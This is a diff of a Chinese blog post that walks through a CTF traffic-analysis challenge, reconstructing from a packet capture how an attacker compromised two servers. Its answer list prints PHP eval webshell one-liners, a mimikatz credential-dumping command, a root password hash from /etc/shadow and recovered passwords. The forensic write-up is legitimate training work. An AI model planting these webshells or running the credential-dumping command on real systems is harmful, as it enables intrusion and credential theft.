@@ -236,10 +236,16 @@
 <p>从而得到了答案<br>我们不难想起来，第二台服务器开了6379端口，即redis服务，所以我个人认为，黑客应该是通过打redis获取root权限，然后向第二台机子写入的小马<br>那么既然是打redis，我们过滤http流量肯定是不行的，所以这里选择过滤tcp<br>不难找到以下攻击<br><img src="/images/6.1022.png"><br>可见黑客的确反弹了shell，获取了权限<br>然后黑客进行了大量操作<br><img src="/images/6.1023.png"><br>其中不难发现，黑客查看了敏感文件/etc/shadow，并写入了shell:indexs.php<br><img src="/images/6.1024.png"><br>其中root信息为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$pJIpnrap9xQnDvB/$dGJnXpT1mMIzAD7K0WiE12rKVRgqCleL9u528e/Bgc2AIblZ3I1bDXfkLZhFehU/C3eCt/il35tiQP1DFccVO0:17030:0:99999:7:::</span><br></pre></td></tr></table></figure></p>
 <p>这里对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$pJIpnrap9xQnDvB/$dGJnXpT1mMIzAD7K0WiE12rKVRgqCleL9u528e/Bgc2AIblZ3I1bDXfkLZhFehU/C3eCt/il35tiQP1DFccVO0</span><br></pre></td></tr></table></figure></p>
 <p>爆破无果，后来跳过该题目才知道，竟然是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Simplexue123</span><br></pre></td></tr></table></figure></p>
-<p>竟然还带着点猜和脑洞，好吧~<br>但是这一系列的操作里，我们得到了许多后续答案<br>我们整理一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">15.黑客在服务器2中查看了哪个敏感文件(拿到shell之后)，请写出绝对路径  </span><br><span class="line">/etc/shadow  </span><br><span class="line">17.黑客在redis未授权访问中反弹shell的ip和端口是多少  </span><br><span class="line">202.1.1.2/6666</span><br><span class="line">18.黑客拿到root权限后执行的第二条命令是什么  </span><br><span class="line">cd /var/www/html</span><br><span class="line">19.服务器2的root用户密码是什么  </span><br><span class="line">Simplexue123  </span><br><span class="line">20.黑客向服务器2写入webshell的命令</span><br><span class="line">echo &apos;&lt;?php eval($_POST[a]);&apos;&gt;indexs.php </span><br><span class="line">``` </span><br><span class="line">然后是最后剩下的两个题目，关于服务器2的管理员密码，我们在第6个数据包里不难发现黑客读取的内容</span><br><span class="line">这里过滤选择关键词admin或者root都可以</span><br><span class="line">&lt;img src=&quot;/images/6.1025.png&quot;&gt; </span><br><span class="line">解md5后得到管理员密码</span><br><span class="line">112233.com</span><br><span class="line">最后得到答案</span><br><span class="line">admin/112233.com</span><br><span class="line">关于最后一个题，比较难受，我们是谷歌到的特征，关于无偿arp包，其isgratuitous必须为true</span><br><span class="line">故此挨个过滤每个数据包</span><br></pre></td></tr></table></figure></p>
-<p>arp &amp;&amp; arp.isgratuitous == true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/images/6.1026.png&quot;&gt; </span><br><span class="line">依次查看，即可得到答案</span><br></pre></td></tr></table></figure></p>
-<p>192.168.3.213<br>192.168.3.6<br>192.168.3.19<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 题目答案</span><br></pre></td></tr></table></figure></p>
-<p>1.被攻击的两个服务器的内网ip分别是多少，以下简称服务器1和2(格式：空格分隔，按黑客攻击顺序排列)<br>192.168.1.74 192.186.2.66<br>2.两台服务器的主机名分别是什么<br>TEST-7E28AF8836 cloude<br>3.黑客使用了什么工具对服务器1进行的攻击(小写)<br>sqlmap<br>4.黑容成功登陆网站后台的账号密码以及验证码是什么(格式user/pass/vcode)<br>admin/adminlwphp/WD7x<br>5.黑客向服务器1写入webshell的具体命令是什么(url解码后)<br>echo ^&lt;?php^ eval($_POST[ge]);?^&gt;&gt;abc.php<br>6.服务器1都开启了哪些允许外连的TCP注册端口(端口号从小到大，用空格间隔)<br>1025 3306 3389<br>7.服务器1安装的修补程序名称<br>Q147222<br>8.网站根目录的绝对路径(注意：大写，左斜杠，最后要有一个斜杠)<br>C:/WWW/<br>9.黑客使用什么命令或文件进行的内网扫描<br>scan.php<br>10.扫描结果中服务器2开放了哪些端口(端口号从小到大，用空格隔开)<br>80 3306 6379<br>11.黑客执行的什么命令将administrator的密码保存到文件中<br>mimikatz.exe “”privilege::debug”” “”sekurlsa::logonpasswords”” exit &gt;&gt;log.txt<br>12.服务器1的系统管理员administrator的密码是什么<br>Simplexue123<br>13.黑客进行内外扫描的ip范围(格式:xx.xx.xx.xx~xx.xx.xx.xx)<br>192.168.1.1~192.168.3.255<br>14.服务器1的mysql的root用户的密码是什么<br>windpasssql<br>15.黑客在服务器2中查看了哪个敏感文件(拿到shell之后)，请写出绝对路径<br>/etc/shadow<br>16.服务器2的web网站后台账号密码(格式:账号/密码)<br>admin/112233.com<br>17.黑客在redis未授权访问中反弹shell的ip和端口是多少<br>202.1.1.2/6666<br>18.黑客拿到root权限后执行的第二条命令是什么<br>cd /var/www/html<br>19.服务器2的root用户密码是什么<br>Simplexue123<br>20.黑客向服务器2写入webshell的命令<br>echo ‘&lt;?php eval($_POST[a]);’&gt;indexs.php<br>21.pcap中哪些ip发送过无偿ARP包(空格分隔，时间顺序排序)<br>192.168.3.213 192.168.3.6 192.168.3.19<br><code>`</code></p>
+<p>竟然还带着点猜和脑洞，好吧~<br>但是这一系列的操作里，我们得到了许多后续答案<br>我们整理一下</p>
+<blockquote>
+<p>15.黑客在服务器2中查看了哪个敏感文件(拿到shell之后)，请写出绝对路径<br><code>/etc/shadow</code><br>17.黑客在redis未授权访问中反弹shell的ip和端口是多少<br><code>202.1.1.2/6666</code><br>18.黑客拿到root权限后执行的第二条命令是什么<br><code>cd /var/www/html</code><br>19.服务器2的root用户密码是什么<br><code>Simplexue123</code><br>20.黑客向服务器2写入webshell的命令<br><code>echo &#39;&lt;?php eval($_POST[a]);&#39;&gt;indexs.php</code></p>
+</blockquote>
+<p>然后是最后剩下的两个题目，关于服务器2的管理员密码，我们在第6个数据包里不难发现黑客读取的内容<br>这里过滤选择关键词admin或者root都可以<br><img src="/images/6.1025.png"><br>解md5后得到管理员密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">112233.com</span><br></pre></td></tr></table></figure></p>
+<p>最后得到答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/112233.com</span><br></pre></td></tr></table></figure></p>
+<p>关于最后一个题，比较难受，我们是谷歌到的特征，关于无偿arp包，其isgratuitous必须为true<br>故此挨个过滤每个数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp &amp;&amp; arp.isgratuitous == true</span><br></pre></td></tr></table></figure>
+<p><img src="/images/6.1026.png"><br>依次查看，即可得到答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.213</span><br><span class="line">192.168.3.6</span><br><span class="line">192.168.3.19</span><br></pre></td></tr></table></figure></p>
+<h2 id="题目答案"><a href="#题目答案" class="headerlink" title="题目答案"></a>题目答案</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">1.被攻击的两个服务器的内网ip分别是多少，以下简称服务器1和2(格式：空格分隔，按黑客攻击顺序排列)  </span><br><span class="line">192.168.1.74 192.186.2.66  </span><br><span class="line">2.两台服务器的主机名分别是什么</span><br><span class="line">TEST-7E28AF8836 cloude</span><br><span class="line">3.黑客使用了什么工具对服务器1进行的攻击(小写)  </span><br><span class="line">sqlmap  </span><br><span class="line">4.黑容成功登陆网站后台的账号密码以及验证码是什么(格式user/pass/vcode)  </span><br><span class="line">admin/adminlwphp/WD7x  </span><br><span class="line">5.黑客向服务器1写入webshell的具体命令是什么(url解码后)  </span><br><span class="line">echo ^&lt;?php^ eval($_POST[ge]);?^&gt;&gt;abc.php</span><br><span class="line">6.服务器1都开启了哪些允许外连的TCP注册端口(端口号从小到大，用空格间隔)  </span><br><span class="line">1025 3306 3389   </span><br><span class="line">7.服务器1安装的修补程序名称  </span><br><span class="line">Q147222  </span><br><span class="line">8.网站根目录的绝对路径(注意：大写，左斜杠，最后要有一个斜杠)  </span><br><span class="line">C:/WWW/  </span><br><span class="line">9.黑客使用什么命令或文件进行的内网扫描  </span><br><span class="line">scan.php  </span><br><span class="line">10.扫描结果中服务器2开放了哪些端口(端口号从小到大，用空格隔开)  </span><br><span class="line">80 3306 6379  </span><br><span class="line">11.黑客执行的什么命令将administrator的密码保存到文件中  </span><br><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot; exit &gt;&gt;log.txt  </span><br><span class="line">12.服务器1的系统管理员administrator的密码是什么   </span><br><span class="line">Simplexue123   </span><br><span class="line">13.黑客进行内外扫描的ip范围(格式:xx.xx.xx.xx~xx.xx.xx.xx)  </span><br><span class="line">192.168.1.1~192.168.3.255  </span><br><span class="line">14.服务器1的mysql的root用户的密码是什么   </span><br><span class="line">windpasssql</span><br><span class="line">15.黑客在服务器2中查看了哪个敏感文件(拿到shell之后)，请写出绝对路径  </span><br><span class="line">/etc/shadow  </span><br><span class="line">16.服务器2的web网站后台账号密码(格式:账号/密码)  </span><br><span class="line">admin/112233.com</span><br><span class="line">17.黑客在redis未授权访问中反弹shell的ip和端口是多少  </span><br><span class="line">202.1.1.2/6666</span><br><span class="line">18.黑客拿到root权限后执行的第二条命令是什么  </span><br><span class="line">cd /var/www/html</span><br><span class="line">19.服务器2的root用户密码是什么  </span><br><span class="line">Simplexue123  </span><br><span class="line">20.黑客向服务器2写入webshell的命令</span><br><span class="line">echo &apos;&lt;?php eval($_POST[a]);&apos;&gt;indexs.php  </span><br><span class="line">21.pcap中哪些ip发送过无偿ARP包(空格分隔，时间顺序排序)  </span><br><span class="line">192.168.3.213 192.168.3.6 192.168.3.19</span><br></pre></td></tr></table></figure>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>终于打完了自己的一场比赛，说实话发挥并不理想，比自己预期的解题速度慢了许多，还是有很多不了解的知识点。希望借助重复的训练增强自己吧~</p>
 
     </article>
@@ -327,7 +333,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目描述"><span class="toc-number">2.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目解析-part-1"><span class="toc-number">3.</span> <span class="toc-text">题目解析(part 1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#阶段性梳理"><span class="toc-number">4.</span> <span class="toc-text">阶段性梳理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目解析-part-2"><span class="toc-number">5.</span> <span class="toc-text">题目解析(part 2)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目描述"><span class="toc-number">2.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目解析-part-1"><span class="toc-number">3.</span> <span class="toc-text">题目解析(part 1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#阶段性梳理"><span class="toc-number">4.</span> <span class="toc-text">阶段性梳理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目解析-part-2"><span class="toc-number">5.</span> <span class="toc-text">题目解析(part 2)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目答案"><span class="toc-number">6.</span> <span class="toc-text">题目答案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">7.</span> <span class="toc-text">后记</span></a></li></ol>
     </div>
     
     <div class="back-top">&#xe639;</div>
@@ -341,6 +347,132 @@
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-archive">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -2333,12 +2465,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/数据分析-企业渗透过程/" >数据分析-企业渗透过程</a>
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/流量分析-CTF题目实战/" >流量分析-CTF题目实战</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/流量分析-CTF题目实战/" >流量分析-CTF题目实战</a>
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/数据分析-企业渗透过程/" >数据分析-企业渗透过程</a>
         </li>
     
     
@@ -2827,6 +2959,11 @@
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
         </li>
     
@@ -2838,11 +2975,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
